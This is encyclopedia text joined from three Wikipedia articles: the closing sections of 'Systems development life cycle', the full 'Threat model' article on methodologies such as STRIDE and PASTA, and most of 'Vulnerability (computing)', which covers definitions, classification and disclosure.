SDLC phase objectives are described in this section with key deliverables, a description of recommended tasks, and a summary of related control objectives for effective management. It is critical for the project manager to establish and monitor control objectives while executing projects. Control objectives are clear statements of the desired result or purpose and should be defined and monitored throughout a project. Control objectives can be grouped into major categories (domains), and relate to the SDLC phases as shown in the figure.[20]
To manage and control a substantial SDLC initiative, a work breakdown structure (WBS) captures and schedules the work. The WBS and all programmatic material should be kept in the "project description" section of the project notebook.[clarification needed] The project manager chooses a WBS format that best describes the project.
The diagram shows that coverage spans numerous phases of the SDLC but the associated MCD[clarification needed] shows mappings to SDLC phases. For example, Analysis and Design is primarily performed as part of the Acquisition and Implementation Domain, and System Build and Prototype is primarily performed as part of delivery and support.[20]

Work breakdown structured organization[edit]
 Work breakdown structure[20]
The upper section of the WBS provides an overview of the project scope and timeline. It should also summarize the major phases and milestones. The middle section is based on the SDLC phases. WBS elements consist of milestones and tasks to be completed rather than activities to be undertaken and have a deadline. Each task has a measurable output (e.g., analysis document). A WBS task may rely on one or more activities (e.g. coding). Parts of the project needing support from contractors should have a statement of work (SOW). The development of a SOW does not occur during a specific phase of SDLC but is developed to include the work from the SDLC process that may be conducted by contractors.[20]

Baselines[edit]
Baselines[clarification needed] are established after four of the five phases of the SDLC, and are critical to the iterative nature of the model.[21] Baselines become milestones.

functional baseline: established after the conceptual design phase.
allocated baseline: established after the preliminary design phase.
product baseline: established after the detail design and development phase.
updated product baseline: established after the production construction phase.
Alternative methodologies[edit]
Alternative software development methods to systems development life cycle are:

Software prototyping
Joint applications development (JAD)
Rapid application development (RAD)
Extreme programming (XP);
Open-source development
End-user development
Object-oriented programming

Comparison of Methodology Approaches (Post, & Anderson 2006)[22]




SDLC

RAD

Open source

Objects

JAD

Prototyping

End User


Control

Formal

MIS

Weak

Standards

Joint

User

User


Time frame

Long

Short

Medium

Any

Medium

Short

Short
–



Users

Many

Few

Few

Varies

Few

One or two

One


MIS staff

Many

Few

Hundreds

Split

Few

One or two

None


Transaction/DSS

Transaction

Both

Both

Both

DSS

DSS

DSS


Interface

Minimal

Minimal

Weak

Windows

Crucial

Crucial

Crucial


Documentation and training

Vital

Limited

Internal

In Objects

Limited

Weak

None


Integrity and security

Vital

Vital

Unknown

In Objects

Limited

Weak

Weak


Reusability

Limited

Some

Maybe

Vital

Limited

Weak

None

Strengths and weaknesses[edit]
Fundamentally, SDLC trades flexibility for control by imposing structure. It is more commonly used for large scale projects with many developers. 


Strength and Weaknesses of SDLC[22]


Strengths

Weaknesses


Control

Increased development time


Monitor large projects

Increased development cost


Detailed steps

Systems must be defined up front


Evaluate costs and completion targets

Rigidity


Documentation

Hard to estimate costs, project overruns


Well defined user input

User input is sometimes limited


Ease of maintenance

Little parallelism


Development and design standards

Automation of documentation and standards is limited


Tolerates changes in MIS of staffing

Does not tolerate changes in requirements




Projects canned early on the result in little or no value

See also[edit]
Application lifecycle management
Decision cycle
IPO model
Software development methodologies
References[edit]


^ SELECTING A DEVELOPMENT APPROACH. Retrieved 17 July 2014.

^ Parag C. Pendharkara; James A. Rodgerb; Girish H. Subramanian (November 2008). "An empirical study of the Cobb–Douglas production function properties of software development effort". Information and Software Technology. 50 (12): 1181–1188. doi:10.1016/j.infsof.2007.10.019.

^ "Systems Development Life Cycle from". FOLDOC. Retrieved 2013-06-14.

^ "Software Development Life Cycle (SDLC)".

^ "SDLC Overview: Models & Methodologies". Retrieved 2021-12-12.

^ Taylor, James (2004). Managing Information Technology Projects. p. 39.

^ "What is Scrum?". December 24, 2019.

^ a b Geoffrey Elliott & Josh Strachan (2004) Global Business Information Technology. p.87.

^ a b c d US Department of Justice (2003). INFORMATION RESOURCES MANAGEMENT Chapter 1. Introduction.

^ a b c Everatt, G.D.; McLeod, R Jr (2007). "Chapter 2: The Software Development Life Cycle". Software Testing: Testing Across the Entire Software Development Life Cycle. John Wiley & Sons. pp. 29–58. ISBN 9780470146347.

^ Unhelkar, B. (2016). The Art of Agile Practice: A Composite Approach for Projects and Organizations. CRC Press. pp. 56–59. ISBN 9781439851197.

^ Land, S.K.; Smith, D.B.; Walz, J.W. (2012). Practical Support for Lean Six Sigma Software Process Definition: Using IEEE Software Engineering Standards. John Wiley & Sons. pp. 341–3. ISBN 9780470289952.

^ Kay, Russell (May 14, 2002). "QuickStudy: System Development Life Cycle". ComputerWorld.

^ Taylor, G.D. (2008). Introduction to Logistics Engineering. CRC Press. pp. 12.6–12.18. ISBN 9781420088571.

^ "Chapter 5". Information Systems Control and Audit (PDF). Institute of Chartered Accountants of India. August 2013. p. 5.28.

^ Radack, S. (n.d.). "The system development life cycle (SDLC)" (PDF). National Institute of Standards and Technology.

^ Blanchard and Fabrycky (2006). Systems Engineering and Analysis, Fourth Edition. Prentice Hall. p. 19.

^ Dr. Joahn Gouws (2007). Introduction to Engineering, System Engineering. Melikon Pty Ltd.

^ Cunningham, James. "HERC Maintenance". Fargo. XXI (North Avenue): 49. Archived from the original on 21 January 2013. Retrieved 13 May 2009.

^ a b c d e U.S. House of Representatives (1999). Systems Development Life-Cycle Policy. p.13. Archived 2013-10-19 at the Wayback Machine

^ Blanchard, B. S., & Fabrycky, W. J.(2006) Systems engineering and analysis (4th ed.) New Jersey: Prentice Hall. p.31

^ a b Post, G., & Anderson, D., (2006). Management information systems: Solving business problems with information technology. (4th ed.).  New York:  McGraw-Hill Irwin.


Further reading[edit]
Cummings, Haag (2006). Management Information Systems for the Information Age. Toronto, McGraw-Hill Ryerson
Beynon-Davies P. (2009). Business Information Systems. Palgrave, Basingstoke. ISBN 978-0-230-20368-6
Computer World, 2002, Retrieved on June 22, 2006, from the World Wide Web:
Management Information Systems, 2005, Retrieved on June 22, 2006, from the World Wide Web:
External links[edit]



Wikimedia Commons has media related to Systems Development Life Cycle.

The Agile System Development Lifecycle
Pension Benefit Guaranty Corporation – Information Technology Solutions Lifecycle Methodology
DoD Integrated Framework Chart IFC (front, back)
FSA Life Cycle Framework
HHS Enterprise Performance Life Cycle Framework
The Open Systems Development Life Cycle
System Development Life Cycle Evolution Modeling
Zero Deviation Life Cycle
Integrated Defense AT&L Life Cycle Management Chart, the U.S. DoD form of this concept.
vteSoftware engineeringFields
Computer programming
DevOps
Requirements engineering
Site reliability engineering
Software deployment
Software design
Software maintenance
Software testing
Systems analysis
Formal methods
Concepts
Data modeling
Enterprise architecture
Functional specification
Modeling language
Programming paradigm
Software
Software archaeology
Software architecture
Software configuration management
Software development process/methodology
Software quality
Software quality assurance
Software verification and validation
Structured analysis
Essential Analysis
CI/CD
Orientations
Agile
Aspect-oriented
Object orientation
Ontology
Service orientation
SDLC
ModelsDevelopmental
Agile
EUP
Executable UML
Incremental model
Iterative model
Prototype model
RAD
UP
Scrum
Spiral model
V-Model
Waterfall model
XP
Other
SPICE
CMMI
Data model
ER model
Function model
Information model
Metamodeling
Object model
Systems model
View model
Languages
IDEF
UML
USL
SysML
Related fields
Computer science
Computer engineering
Information science
Project management
Risk management
Systems engineering

 Commons
 Category

vteSystems engineeringSubfields
Aerospace engineering
Biological systems engineering
Configuration management
Earth systems engineering and management
Electrical engineering
Enterprise systems engineering
Performance engineering
Reliability engineering
Safety engineering
Processes
Requirements engineering
Functional specification
System integration
Verification and validation
Design review
Concepts
Business process
System
System lifecycle
V-Model
Systems development life cycle
Tools
Decision-making
Function modelling
IDEF
Optimization
Quality function deployment
System dynamics
Systems Modeling Language
Systems analysis
Systems modeling
Work breakdown structure
People
James S. Albus
Ruzena Bajcsy
Benjamin S. Blanchard
Wernher von Braun
Kathleen Carley
Harold Chestnut
Wolt Fabrycky
Barbara Grosz
Arthur David Hall III
Derek Hitchins
Robert E. Machol
Radhika Nagpal
Simon Ramo
Joseph Francis Shea
Katia Sycara
Manuela M. Veloso
John N. Warfield
Related fields
Control engineering
Computer engineering
Industrial engineering
Operations research
Project management
Quality management
Risk management
Software engineering

Category





Retrieved from "https://en.wikipedia.org/w/index.php?title=Systems_development_life_cycle&oldid=1134872784"
Categories: Systems engineeringComputing terminologySoftware development processSoftware engineeringHidden categories: Webarchive template wayback linksArticles with short descriptionShort description is different from WikidataUse American English from March 2019All Wikipedia articles written in American EnglishAll articles with unsourced statementsArticles with unsourced statements from December 2009Articles with unsourced statements from August 2021Wikipedia articles needing clarification from January 2023Articles lacking in-text citations from January 2023All articles lacking in-text citationsCommons category link is on Wikidata
 



From Wikipedia, the free encyclopedia


Threat modeling is a process by which potential threats, such as structural vulnerabilities or the absence of appropriate safeguards, can be identified and enumerated, and countermeasures prioritized.[1] The purpose of threat modeling is to provide defenders with a systematic analysis of what controls or defenses need to be included, given the nature of the system, the probable attacker's profile, the most likely attack vectors, and the assets most desired by an attacker. Threat modeling answers questions like “Where am I most vulnerable to attack?”, “What are the most relevant threats?”, and “What do I need to do to safeguard against these threats?”.
Conceptually, most people incorporate some form of threat modeling in their daily life and don't even realize it.[citation needed] Commuters use threat modeling to consider what might go wrong during the morning journey to work and to take preemptive action to avoid possible accidents. Children engage in threat modeling when determining the best path toward an intended goal while avoiding the playground bully. In a more formal sense, threat modeling has been used to prioritize military defensive preparations since antiquity.


Evolution of IT-based threat modeling[edit]
Shortly after shared computing made its debut in the early 1960s individuals began seeking ways to exploit security vulnerabilities for personal gain.[2] As a result, engineers and computer scientists soon began developing threat modeling concepts for information technology systems.
Early IT-based threat modeling methodologies were based on the concept of architectural patterns[3] first presented by Christopher Alexander in 1977. In 1988 Robert Barnard developed and successfully applied the first profile for an IT-system attacker.
In 1994, Edward Amoroso put forth the concept of a “threat tree” in his book, “Fundamentals of Computer Security Technology.[4]” The concept of a threat tree was based on decision tree diagrams. Threat trees graphically represent how a potential threat to an IT system can be exploited.
Independently, similar work was conducted by the NSA and DARPA on a structured graphical representation of how specific attacks against IT-systems could be executed. The resulting representation was called “attack trees.” In 1998 Bruce Schneier published his analysis of cyber risks utilizing attack trees in his paper entitled “Toward a Secure System Engineering Methodology.[5]” The paper proved to be a seminal contribution in the evolution of threat modeling for IT-systems. In Schneier's analysis, the attacker's goal is represented as a “root node,” with the potential means of reaching the goal represented as “leaf nodes.” Utilizing the attack tree in this way allowed cybersecurity professionals to systematically consider multiple attack vectors against any defined target.
In 1999, Microsoft cybersecurity professionals Loren Kohnfelder and Praerit Garg developed a model for considering attacks relevant to the Microsoft Windows development environment.  (STRIDE[1] is an acrostic for: Spoofing identity, Tampering with data, Repudiation, Information disclosure, Denial of service, Elevation of privilege) The resultant mnemonic helps security professionals systematically determine how a potential attacker could utilize any threat included in STRIDE.
In 2003, OCTAVE[6] (Operationally Critical Threat, Asset, and Vulnerability Evaluation) method, an operations-centric threat modeling methodology, was introduced with a focus on organizational risk management.
In 2004, Frank Swiderski and Window Snyder wrote “Threat Modeling,” by Microsoft press. In it they developed the concept of using threat models to create secure applications.
In 2014 Ryan Stillions expressed the idea that cyber threats should be expressed with different semantic levels, and proposed the DML (Detection Maturity Level) model.[7] An attack is an instantiation of a threat scenario which is caused by a specific attacker with a specific goal in mind and a strategy for reaching that goal. The goal and strategy represent the highest semantic levels of the DML model. This is followed by the TTP (Tactics, Techniques and Procedures) which represent intermediate semantic levels. The lowest semantic levels of the DML model are the tools used by the attacker, host and observed network artifacts such as packets and payloads, and finally atomic indicators such as IP addresses at the lowest semantic level. Current SIEM (Security Information and Event Management) tools typically only provide indicators at the lowest semantic levels. There is therefore a need to develop SIEM tools that can provide threat indicators at higher semantic levels.[8]

Threat modeling methodologies for IT purposes[edit]
Conceptually, a threat modeling practice flows from a methodology. Numerous threat modeling methodologies are available for implementation. Typically, threat modeling has been implemented using one of five approaches independently, asset-centric, attacker-centric, software-centric, value and stakeholder-centric, and hybrid. Based on the volume of published online content, the methodologies discussed below are the most well known.

STRIDE methodology[edit]
The STRIDE approach to threat modeling was introduced in 1999 at Microsoft, providing a mnemonic for developers to find 'threats to our products'.[9] STRIDE, Patterns and Practices, and Asset/entry point were amongst the threat modeling approaches developed and published by Microsoft.   References to "the" Microsoft methodology commonly mean STRIDE and Data Flow Diagrams.

P.A.S.T.A.[edit]
The Process for Attack Simulation and Threat Analysis (PASTA) is a seven-step, risk-centric methodology.[10] It provides a seven-step process for aligning business objectives and technical requirements, taking into account compliance issues and business analysis. The intent of the method is to provide a dynamic threat identification, enumeration, and scoring process. Once the threat model is completed, security subject matter experts develop a detailed analysis of the identified threats. Finally, appropriate security controls can be enumerated. This methodology is intended to provide an attacker-centric view of the application and infrastructure from which defenders can develop an asset-centric mitigation strategy.

Trike[edit]
The focus of the Trike methodology[11] is using threat models as a risk-management tool. Within this framework, threat models are used to satisfy the security auditing process. Threat models are based on a “requirements model.” The requirements model establishes the stakeholder-defined “acceptable” level of risk assigned to each asset class. Analysis of the requirements model yields a threat model from which threats are enumerated and assigned risk values. The completed threat model is used to construct a risk model based on asset, roles, actions, and calculated risk exposure.

VAST[edit]
The Visual, Agile and Simple Threat (VAST) methodology,[12] is based on ThreatModeler, a commercial automated threat-modeling platform. VAST requires creating two types of models: application threat models and operational threat models. Application threat models use process-flow diagrams, representing the architectural point of view. Operational threat models are created from an attacker point of view based on DFDs. This approach allows for the integration of VAST into the organization's development and DevOps lifecycles.[13]

The Hybrid Threat Modeling Method[edit]
Researchers created this method to combine the positive elements of different methodologies.[14][15][16] This methodology combines different methodologies, including SQUARE[17] and the Security Cards[18] and Personae Non Gratae.[19]

Generally accepted IT threat modeling processes[edit]
All IT-related threat modeling processes start with creating a visual representation of the application and / or infrastructure being analyzed. The application / infrastructure is decomposed into various elements to aid in the analysis. Once completed, the visual representation is used to identify and enumerate potential threats. Further analysis of the model regarding risks associated with identified threats, prioritization of threats, and enumeration of the appropriate mitigating controls depends on the methodological basis for the threat model process being utilized. The identification and enumeration of threats (or of mitigation objectives), can either be carried out in an attack-centric way or in an asset-centric way. The former focuses on the types of possible attacks that shall be mitigated, whereas the latter focuses on the assets that shall be protected.

Visual representations based on data flow diagrams[edit]
 
The Microsoft methodology, PASTA, and Trike each develop a visual representation of the application-infrastructure utilizing data flow diagrams (DFD). DFDs were developed in the 1970s as tool for system engineers to communicate, on a high level, how an application caused data to flow, be stored, and manipulated by the infrastructure upon which the application runs. Traditionally, DFDs utilize only four unique symbols: data flows, data stores, processes, and interactors. In the early 2000s, an additional symbol, trust boundaries, were added to allow DFDs to be utilized for threat modeling.
Once the application-infrastructure system is decomposed into its five elements, security experts consider each identified threat entry point against all known threat categories. Once the potential threats are identified, mitigating security controls can be enumerated or additional analysis can be performed.

Further fields of application[edit]
Threat modeling is being applied not only to IT but also to other areas such as vehicle,[20][21] building and home automation.[22] In this context, threats to security and privacy like information about the inhabitant's movement profiles, working times, and health situations are modeled as well as physical or network-based attacks. The latter could make use of more and more available smart building features, i.e., sensors (e.g., to spy on the inhabitant) and actuators (e.g., to unlock doors).[22]

References[edit]


^ a b "The STRIDE Threat Mode". Microsoft. 2016.

^ McMillan, Robert (2012). "The World's First Computer Password? It Was Useless Too". Wired Business.

^ Shostack, Adam (2014). "Threat Modeling: Designing for Security". John Wiley & Sons Inc: Indianapolis.

^ Amoroso, Edward G (1994). Fundamentals of Computer Security Technology. AT&T Bell Labs. Prentice-Hall: Upper Saddle River. ISBN 9780131089297.

^ Schneier, Bruce;  et al. (1998). "Toward A Secure System Engineering Methodology" (PDF). National Security Agency: Washington.

^ Alberts, Christopher (2003). "Introduction to the OCTAVE® Approach" (PDF). Software Engineering Institute, Carnegie Mellon: Pittsburg.

^ Stillions, Ryan (2014). "The DML Model". Ryan Stillions security blog. Ryan Stillions.

^ Bromander, Siri (2016). "Semantic Cyberthreat Modelling" (PDF). Semantic Technology for Intelligence, Defence and Security (STIDS 2016).

^ Kohnfelder, Loren; Garg, Praerit. "Threats to Our Products". Microsoft. Retrieved 20 September 2016.

^ Ucedavélez, Tony and Marco M. Morana (2015). "Risk Centric Threat Modeling: Process for Attack Simulation and Threat Analysis". John Wiley & Sons: Hobekin.

^ Eddington, Michael, Brenda Larcom, and Eleanor Saitta (2005). "Trike v1 Methodology Document". Octotrike.org.

^ Fruhlinger, Josh (2020-04-15). "Threat modeling explained: A process for anticipating cyber attacks". CSO Online. Retrieved 2022-02-03.

^ "Threat Modeling: 12 Available Methods". SEI Blog. Retrieved 2022-02-03.

^ "The Hybrid Threat Modeling Method".

^ "A Hybrid Threat Modeling Method".

^ https://www.amazon.com/Threat-Modeling-Identification-Avoidance-Secure/dp/1492056553/

^ "Security Quality Requirements Engineering Technical Report".

^ https://securitycards.cs.washington.edu/

^ "CSDL | IEEE Computer Society".

^ http://publications.lib.chalmers.se/records/fulltext/252083/local_252083.pdf[bare URL PDF]

^ Hamad, Mohammad; Prevelakis, Vassilis; Nolte, Marcus (November 2016). "Towards Comprehensive Threat Modeling for Vehicles" (PDF). Publications Institute of Computer and Network Engineering. doi:10.24355/dbbs.084-201806251532-0. Retrieved 11 March 2019. {{cite journal}}: Cite journal requires |journal= (help)

^ a b Meyer, D.; Haase, J.; Eckert, M.; Klauer, B. (2016-07-01). "A threat-model for building and home automation". 2016 IEEE 14th International Conference on Industrial Informatics (INDIN): 860–866. doi:10.1109/INDIN.2016.7819280. ISBN 978-1-5090-2870-2. S2CID 12725362.






Retrieved from "https://en.wikipedia.org/w/index.php?title=Threat_model&oldid=1120012263"
Categories: Computer security exploitsHidden categories: All articles with bare URLs for citationsArticles with bare URLs for citations from March 2022Articles with PDF format bare URLs for citationsCS1 errors: missing periodicalAll articles with unsourced statementsArticles with unsourced statements from May 2022
 



From Wikipedia, the free encyclopedia


Exploitable weakness in a computer system
Part of a series onInformation security
Related security categories
Computer security
Automotive security
Cybercrime
Cybersex trafficking
Computer fraud
Cybergeddon
Cyberterrorism
Cyberwarfare
Electronic warfare
Information warfare
Internet security
Mobile security
Network security
Copy protection
Digital rights management

Threats
Adware
Advanced persistent threat
Arbitrary code execution
Backdoors
Hardware backdoors
Code injection
Crimeware
Cross-site scripting
Cryptojacking malware
Botnets
Data breach
Drive-by download
Browser helper objects
Viruses
Data scraping
Denial of service
Eavesdropping
Email fraud
Email spoofing
Exploits
Keyloggers
Logic bombs
Time bombs
Fork bombs
Zip bombs
Fraudulent dialers
Malware
Payload
Phishing
Polymorphic engine
Privilege escalation
Ransomware
Rootkits
Bootkits
Scareware
Shellcode
Spamming
Social engineering
Screen scraping
Spyware
Software bugs
Trojan horses
Hardware Trojans
Remote access trojans
Vulnerability
Web shells
Wiper
Worms
SQL injection
Rogue security software
Zombie

Defenses
Application security
Secure coding
Secure by default
Secure by design
Misuse case
Computer access control
Authentication
Multi-factor authentication
Authorization
Computer security software
Antivirus software
Security-focused operating system
Data-centric security
Code obfuscation
Data masking
Encryption
Firewall
Intrusion detection system
Host-based intrusion detection system (HIDS)
Anomaly detection
Security information and event management (SIEM)
Mobile secure gateway
Runtime application self-protection
vte
Part of a series onComputer hacking
History
Phreaking
Cryptovirology
Hacking of consumer electronics
List of hackers

Hacker culture and ethic
Hackathon
Hacker Manifesto
Hackerspace
Hacktivism
Maker culture
Types of hackers
Black hat
Grey hat
White hat

Conferences
Black Hat Briefings
Chaos Communication Congress
DEF CON
Hackers on Planet Earth
Security BSides
ShmooCon
Summercon

Computer crime
Crimeware
List of computer criminals
Script kiddie

Hacking tools
Exploit
forensics-focused operating systems
Payload
Social engineering
Vulnerability

Practice sites
HackThisSite
Zone-H

Malware
Rootkit
Backdoor
Trojan horse
Virus
Worm
Spyware
Ransomware
Logic bomb
Botnet
Keystroke logging
HIDS
Web shell
RCE

Computer security
Application security
Cloud computing security
Network security

Groups
Anonymous
Chaos Computer Club
Homebrew Computer Club (defunct)
Legion of Doom (defunct)
LulzSec (defunct)
Masters of Deception (defunct)
Red team / Blue team

Publications
2600: The Hacker Quarterly
Hacker News
Nuts and Volts
Phrack
vte
Vulnerabilities are flaws in a computer system that weaken the overall security of the device/system. Vulnerabilities can be weaknesses in either the hardware itself, or the software that runs on the hardware. Vulnerabilities can be exploited by a threat actor, such as an attacker, to cross privilege boundaries (i.e. perform unauthorized actions) within a computer system. To exploit a vulnerability, an attacker must have at least one applicable tool or technique that can connect to a system weakness. In this frame, vulnerabilities are also known as the attack surface.
Vulnerability management is a cyclical practice that varies in theory but contains common processes which include: discover all assets, prioritize assets, assess or perform a complete vulnerability scan, report on results, remediate vulnerabilities, verify remediation - repeat. This practice generally refers to software vulnerabilities in computing systems.[1] Agile vulnerability management refers preventing attacks by identifying all vulnerabilities as quickly as possible.[2]
A security risk is often incorrectly classified as a vulnerability. The use of vulnerability with the same meaning of risk can lead to confusion. The risk is the potential of a significant impact resulting from the exploit of a vulnerability. Then there are vulnerabilities without risk: for example when the affected asset has no value. A vulnerability with one or more known instances of working and fully implemented attacks is classified as an exploitable vulnerability—a vulnerability for which an exploit exists. The window of vulnerability is the time from when the security hole was introduced or manifested in deployed software, to when access was removed, a security fix was available/deployed, or the attacker was disabled—see zero-day attack.
Security bug (security defect) is a narrower concept. There are vulnerabilities that are not related to software: hardware, site, personnel vulnerabilities are examples of vulnerabilities that are not software security bugs.
Constructs in programming languages that are difficult to use properly can manifest large numbers of vulnerabilities.


Definitions[edit]
ISO 27005 defines vulnerability as:[3]

A weakness of an asset or group of assets that can be exploited by one or more threats, where an asset is anything that has value to the organization, its business operations, and their continuity, including information resources that support the organization's mission[4]
IETF RFC 4949 vulnerability as:[5]

 A flaw or weakness in a system's design, implementation, or operation and management that could be exploited to violate the system's security policy
The Committee on National Security Systems  of United States of America defined vulnerability  in CNSS Instruction No. 4009 dated 26 April 2010 National Information Assurance Glossary:[6]

Vulnerability—Weakness in an information system, system security procedures, internal controls, or implementation that could be exploited by a threat source.
Many NIST publications define vulnerability  in IT context in different publications: FISMApedia[7] term[8] provide a list. Between them SP 800-30,[9] give a broader one:

 A flaw or weakness in system security procedures, design, implementation, or internal controls that could be exercised (accidentally triggered or intentionally exploited) and result in a security breach or a violation of the system's security policy. 
ENISA defines vulnerability in[10] as:

 The existence of a weakness, design, or implementation error that can lead to an unexpected, undesirable event [G.11] compromising the security of the computer system, network, application, or protocol involved.(ITSEC)
The Open Group defines vulnerability in[11] as

The probability that threat capability exceeds the ability to resist the threat.
Factor Analysis of Information Risk (FAIR) defines vulnerability as:[12]

The probability that an asset will be unable to resist the actions of a threat agent
According to FAIR vulnerability is related to Control Strength, i.e. the strength of control as compared to a standard measure of force and the threat Capabilities, i.e. the probable level of force that a threat agent is capable of applying against an asset.
ISACA defines vulnerability in Risk It framework as:

A weakness in design, implementation, operation or internal control
Data and Computer Security: Dictionary of standards concepts and terms, authors Dennis Longley and Michael Shain, Stockton Press, ISBN 0-935859-17-9, defines vulnerability as:

1) In computer security, a weakness in automated systems security procedures, administrative controls, Internet controls, etc., that could be exploited by a threat to gain unauthorized access to information or to disrupt critical processing. 2) In computer security, a weakness in the physical layout, organization, procedures, personnel, management, administration, hardware or software that may be exploited to cause harm to the ADP system or activity. 3) In computer security, any weakness or flaw existing in a system. The attack or harmful event, or the opportunity available to a threat agent to mount that attack.
Matt Bishop and Dave Bailey[13] give the following definition of computer vulnerability:

A computer system is composed of states describing the current configuration of the entities that make up the computer system. The system computes through the application of state transitions that change the state of the system. All states reachable from a given initial state using a set of state transitions fall into the class of authorized or unauthorized, as defined by a security policy. In this paper, the definitions of these classes and transitions is considered axiomatic. A vulnerable state is an authorized state from which an unauthorized state can be reached using authorized state transitions. A compromised state is the state so reached. An attack is a sequence of authorized state transitions which end in a compromised state. By definition, an attack begins in a vulnerable state. A vulnerability is a characterization of a vulnerable state which distinguishes it from all non-vulnerable states. If generic, the vulnerability may characterize many vulnerable states; if specific, it may characterize only one...
National Information Assurance Training and Education Center defines vulnerability:[14][15]

A weakness in automated system security procedures, administrative controls, internal controls, and so forth, that could be exploited by a threat to gain unauthorized access to information or disrupt critical processing.  2. A weakness in system security procedures, hardware design, internal controls, etc. , which could be exploited to gain unauthorized access to classified or sensitive information.  3. A weakness in the physical layout, organization, procedures, personnel, management, administration, hardware, or software that may be exploited to cause harm to the ADP system or activity. The presence of a vulnerability does not in itself cause harm; a vulnerability is merely a condition or set of conditions that may allow the ADP system or activity to be harmed by an attack.  4. An assertion primarily concerning entities of the internal environment (assets); we say that an asset (or class of assets) is vulnerable (in some way, possibly involving an agent or collection of agents); we write: V(i,e) where: e may be an empty set.  5. Susceptibility to various threats.  6. A set of properties of a specific internal entity that, in union with a set of properties of a specific external entity, implies a risk.  7. The characteristics of a system which cause it to suffer a definite degradation (incapability to perform the designated mission) as a result of having been subjected to a certain level of effects in an unnatural (manmade) hostile environment.
Vulnerability and risk factor models[edit]
A resource (either physical or logical) may have one or more vulnerabilities that can be exploited by a threat actor. The result can potentially compromise the confidentiality, integrity or availability of resources (not necessarily the vulnerable one) belonging to an organization and/or other parties involved (customers, suppliers). The so-called CIA triad is a cornerstone of Information Security.
An attack can be active when it attempts to alter system resources or affect their operation, compromising integrity or availability. A "passive attack" attempts to learn or make use of information from the system but does not affect system resources, compromising confidentiality.[5]

 OWASP: relationship between threat agent and business impact
OWASP (see figure) depicts the same phenomenon in slightly different terms: a threat agent through an attack vector exploits a weakness (vulnerability) of the system and the related security controls, causing a technical impact on an IT resource (asset) connected to a business impact.
The overall picture represents the risk factors of the risk scenario.[16]

Information security management system[edit]
A set of policies concerned with the information security management system (ISMS), has been developed to manage, according to Risk management principles, the countermeasures to ensure a security strategy is set up following the rules and regulations applicable to a given organization. These countermeasures are also called Security controls, but when applied to the transmission of information, they are called security services.[17]

Classification[edit]
Vulnerabilities are classified according to the asset class they are related to:[3]

hardware
susceptibility to humidity or dust
susceptibility to unprotected storage
age-based wear that causes failure
over-heating
software
insufficient testing
insecure coding
lack of audit trail
design flaw
network
unprotected communication lines (e.g. lack of cryptography)
insecure network architecture
personnel
inadequate recruiting process
inadequate security awareness
insider threat
physical site
area subject to natural disasters (e.g. flood, earthquake)
interruption of power source
organizational
lack of regular audits
lack of continuity plans
lack of security
Causes[edit]
Complexity: Large, complex systems increase the probability of flaws and unintended access points.[18]
Familiarity:  Using common, well-known code, software, operating systems, and/or hardware increases the probability an attacker has or can find the knowledge and tools to exploit the flaw.[19]
Connectivity: More physical connections, privileges, ports, protocols, and services and time each of those are accessible increase vulnerability.[12]
Password management flaws: The computer user uses weak passwords that could be discovered by brute force.[20]  The computer user stores the password on the computer where a program can access it.  Users re-use passwords between many programs and websites.[18]
Fundamental operating system design flaws: The operating system designer chooses to enforce suboptimal policies on user/program management.  For example, operating systems with policies such as default permit grant every program and every user full access to the entire computer.[18] This operating system flaw allows viruses and malware to execute commands on behalf of the administrator.[21]
Internet Website Browsing: Some internet websites may contain harmful Spyware or Adware that can be installed automatically on the computer systems. After visiting those websites, the computer systems become infected and personal information will be collected and passed on to third party individuals.[22]
Software bugs: The programmer leaves an exploitable bug in a software program. The software bug may allow an attacker to misuse an application.[18]
Unchecked user input: The program assumes that all user input is safe.  Programs that do not check user input can allow unintended direct execution of commands or SQL statements (known as Buffer overflows, SQL injection or other non-validated inputs).[18]
Not learning from past mistakes:[23][24] for example most vulnerabilities discovered in IPv4 protocol software were discovered in the new IPv6 implementations.[25]
The research has shown that the most vulnerable point in most information systems is the human user, operator, designer, or other human:[26] so humans should be considered in their different roles as asset, threat, information resources. Social engineering is an increasing security concern.

Consequences[edit]
The impact of a security breach can be very high.[27] Most legislation sees the failure of IT managers to address IT systems and applications vulnerabilities if they are known to them as misconduct; IT managers have a responsibility to manage IT risk.[28] Privacy law forces managers to act to reduce the impact or likelihood of that security risk. Information technology security audit is a way to let other independent people certify that the IT environment is managed properly and lessen the responsibilities, at least having demonstrated the good faith. Penetration test is a form of verification of the weakness and countermeasures adopted by an organization: a White hat hacker tries to attack an organization's information technology assets, to find out how easy or difficult it is to compromise the IT security.[29] The proper way to professionally manage the IT risk is to adopt an Information Security Management System, such as ISO/IEC 27002 or Risk IT and follow them, according to the security strategy set forth by the upper management.[17]
One of the key concept of information security is the principle of defence in depth, i.e. to set up a multilayer defense system that can:[27]

prevent the exploit
detect and intercept the attack
find out the threat agents and prosecute them
Intrusion detection system is an example of a class of systems used to detect attacks.
Physical security is a set of measures to physically protect an information asset: if somebody can get physical access to the information asset, it is widely accepted that an attacker can access any information on it or make the resource unavailable to its legitimate users.
Some sets of criteria to be satisfied by a computer, its operating system and applications in order to meet a good security level have been developed: ITSEC and Common criteria are two examples.

Vulnerability disclosure[edit]
Coordinated disclosure (some refer to it as 'responsible disclosure' but that is considered a biased term by others) of vulnerabilities is a topic of great debate. As reported by The Tech Herald in August 2010, "Google, Microsoft, TippingPoint, and Rapid7 have issued guidelines and statements addressing how they will deal with disclosure going forward."[30] The other method is typically full disclosure, when all the details of a vulnerability is publicized, sometimes with the intent to put pressure on the software author to publish a fix more quickly. In January 2014 when Google revealed a Microsoft vulnerability before Microsoft released a patch to fix it, a Microsoft representative called for coordinated practices among software companies in revealing disclosures.[31]

Vulnerability inventory[edit]
Mitre Corporation maintains an incomplete list of publicly disclosed vulnerabilities in a system called Common Vulnerabilities and Exposures. This information is immediately shared with the National Institute of Standards and Technology (NIST), where each vulnerability is given a risk score using Common Vulnerability Scoring System (CVSS), Common Platform Enumeration (CPE) scheme, and Common Weakness Enumeration. 
Cloud service providers often don't list security issues in their services using the CVE system.[32] There is currently no universal standard for cloud computing vulnerability enumeration, severity assessment, and no unified tracking mechanism.[33] The Open CVDB initiative is a community-driven centralized cloud vulnerability database that catalogs CSP vulnerabilities, and lists the steps users can take to detect or prevent these issues in their own environments.[34]
OWASP maintains a list of vulnerability classes with the aim of educating system designers and programmers, therefore reducing the likelihood of vulnerabilities being written unintentionally into the software.[35]

Vulnerability disclosure date[edit]
